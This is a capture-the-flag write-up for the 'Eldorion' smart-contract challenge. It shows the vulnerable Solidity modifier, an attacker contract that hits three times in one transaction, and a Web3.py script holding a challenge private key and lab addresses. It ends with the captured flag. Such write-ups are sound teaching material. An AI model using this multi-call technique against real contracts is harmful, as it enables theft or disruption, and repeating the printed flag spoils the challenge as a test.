---
title: "Eldorion - Cyber Apocalypse CTF 2025: Tales from Eldoria"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["blockchain", "solidity", "web3py", "eldorion", "smart-contract", "cyber-apocalypse-ctf-2025-tale", "cyber-apocalypse-ctf-2025-tales-fr", "2025", "ctf-writeup"]
summary: "This HTB challenge was pure drama: a pixel-perfect realm, an overpowered regenerating beast, and one fabulous hacker armed with Web3, glitter, and Python."
source:
  name: "CTFtime writeup #40119"
  url: "https://ctftime.org/writeup/40119"
original_source: "https://hacqueen-fr.github.io/article.html?id=hacqueen-vs-eldorion.md"
ctf:
  name: "Cyber Apocalypse CTF 2025: Tales from Eldoria"
  year: 2025
  challenge: "Eldorion"
---

## Metadata

- **CTF:** Cyber Apocalypse CTF 2025: Tales from Eldoria
- **Task:** Eldorion
- **Author team:** BrHackeuses
- **CTFtime tags:** blockchain
- **CTFtime:** <https://ctftime.org/writeup/40119>
- **Original writeup:** <https://hacqueen-fr.github.io/article.html?id=hacqueen-vs-eldorion.md>

---
# ✨ Hacqueen vs Eldorion: Bytes, Bravery & a Battle Unicorn ✨

![Hacqueen vs Eldorion](<https://github.com/Hacqueen-fr/hacqueen-fr.github.io/raw/refs/heads/main/assets/hacqueenvsdrakepng>)

This HTB challenge was pure drama: a pixel-perfect realm, an overpowered regenerating beast, and one fabulous hacker armed with Web3, glitter, and Python.

> *Welcome to the realms of Eldoria, adventurer. You’ve found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you. But your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face Eldorion, a colossal beast with terrifying regenerative powers. This creature, known for its ""eternal resilience"" guards the only passage forward. It's clear: you must defeat Eldorion to continue your quest.*

**Goal**: Defeat Eldorion — a smart contract boss that heals every time a new block is mined.

Sounds impossible? Not for Hacqueen. Let’s ride. ??

\---

## Contract Breakdown

```solidity  
modifier eternalResilience() {  
if (block.timestamp > lastAttackTimestamp) {  
health = MAX_HEALTH;  
lastAttackTimestamp = block.timestamp;  
}  
_;  
}  
```

Eldorion has 300 HP. Each attack can only do 100 damage. And it resets health every new block.   
? So we need **three hits in one transaction**.

\---

## The Exploit

### Solidity Contract

```solidity  
contract Slayer {  
IEldorion public target;

constructor(address _target) {  
target = IEldorion(_target);  
}

function slay() external {  
target.attack(100);  
target.attack(100);  
target.attack(100);  
}  
}  
```

Wrapped into a Python script using [Web3.py](http://Web3.py) \+ solcx, we deploy this contract and call `slay()`.

### Python Exploit Script

```python  
from web3 import Web3  
from solcx import compile_source, install_solc, set_solc_version  
import socket  
import time

RPC_URL = "http://94.237.57.68:53823"  
PRIVATE_KEY = "0xd97be7b491c9349d726d8757df1ce9a65cc18f5cd6c9d497eb29284663107a15"  
PLAYER_ADDRESS = "0x886180A2D97C803E011e744d6757f7E4b923E0a0"  
TARGET_ADDRESS = "0x3BE1F55b1De2B149C77677052975c6C2C58BDe91"  
SETUP_ADDRESS = "0x926B826A715B4B7438c88cD7d8d523A70f03Bd63"  
INTERFACE_HOST = "94.237.57.68"  
INTERFACE_PORT = 40453

SOURCE = """  
pragma solidity ^0.8.28;

interface IEldorion {  
function attack(uint256 damage) external;  
}

contract Slayer {  
IEldorion public target;

constructor(address _target) {  
target = IEldorion(_target);  
}

function slay() external {  
target.attack(100);  
target.attack(100);  
target.attack(100);  
}  
}  
"""

install_solc("0.8.28")  
set_solc_version("0.8.28")  
w3 = Web3(Web3.HTTPProvider(RPC_URL))  
acct = w3.eth.account.from_key(PRIVATE_KEY)

compiled = compile_source(SOURCE)  
interface = compiled.popitem()[1]  
SlayerContract = w3.eth.contract(abi=interface['abi'], bytecode=interface['bin'])

deploy_tx = SlayerContract.constructor(TARGET_ADDRESS).build_transaction({  
"from": acct.address,  
"nonce": w3.eth.get_transaction_count(acct.address),  
"gas": 300000,  
"gasPrice": w3.eth.gas_price,  
})  
signed = acct.sign_transaction(deploy_tx)  
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)  
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

if receipt.contractAddress is None:  
print("❌ Deployment failed.")  
exit(1)

slayer_address = receipt.contractAddress  
slayer_instance = w3.eth.contract(address=slayer_address, abi=interface['abi'])

slay_tx = slayer_instance.functions.slay().build_transaction({  
"from": acct.address,  
"nonce": w3.eth.get_transaction_count(acct.address),  
"gas": 200000,  
"gasPrice": w3.eth.gas_price,  
})  
signed = acct.sign_transaction(slay_tx)  
w3.eth.send_raw_transaction(signed.raw_transaction)  
time.sleep(2)

setup_abi = [{  
"inputs": [],  
"name": "isSolved",  
"outputs": [{"internalType": "bool", "name": "", "type": "bool"}],  
"stateMutability": "view",  
"type": "function"  
}]  
setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)  
solved = setup.functions.isSolved().call()

if solved:  
print("✅ Challenge Solved!")  
with socket.create_connection((INTERFACE_HOST, INTERFACE_PORT)) as sock:  
sock.recv(4096)  
sock.sendall(b"3\n")  
flag = sock.recv(4096).decode()  
print("[?] FLAG:\n" + flag)  
else:  
print("❌ Eldorion still stands...")  
```

\---

## Result

Flag in hand, beast on the floor:

```  
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}  
```

\---

## Final Glitterprint

✨ One block.   
Three hits.   
All slay, no delay.

Because when Hacqueen and her unicorn ride in... bugs get patched and beasts get rekt.
